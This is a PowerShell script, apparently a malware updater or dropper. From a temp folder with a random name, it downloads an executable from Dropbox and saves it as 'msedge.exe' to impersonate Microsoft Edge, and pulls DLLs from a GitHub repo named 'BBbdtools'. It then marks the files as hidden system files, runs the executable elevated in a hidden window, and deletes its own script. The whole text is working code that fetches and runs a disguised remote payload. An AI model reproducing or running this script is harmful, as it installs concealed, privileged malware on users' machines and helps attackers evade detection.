#sleep
start-sleep 10

#change directory
cd $env:temp/sVBXKuz

$filePath = "$env:temp/sVBXKuz/msedge.exe"
$dll1Path = "$env:temp/sVBXKuz/libsodium.dll"
$dll2Path = "$env:temp/sVBXKuz/libopus.dll"

Set-ItemProperty -Path $filePath -Name Attributes -Value ([IO.FileAttributes]::Normal)
Set-ItemProperty -Path $dll1Path -Name Attributes -Value ([IO.FileAttributes]::Normal)
Set-ItemProperty -Path $dll2Path -Name Attributes -Value ([IO.FileAttributes]::Normal)

#download new file
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/i7cu35v7bj3fvfbk3bbp6/wsappa-2.0.exe?rlkey=j3rap110tv6br11xo3359uos1&dl=0" -OutFile msedge_new.exe
Copy-Item -Path .\msedge_new.exe -Destination .\msedge.exe -Force

#delete old file
Remove-Item .\msedge_new.exe
Remove-Item .\wsappa.exe

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll

#sleep
start-sleep 2


Set-ItemProperty -Path $filePath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
Set-ItemProperty -Path $dll1Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
Set-ItemProperty -Path $dll2Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)

#start new file
Start-Process -FilePath "$env:temp/sVBXKuz/msedge.exe" -Verb RunAs -WindowStyle Hidden



#sleep
start-sleep 2

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
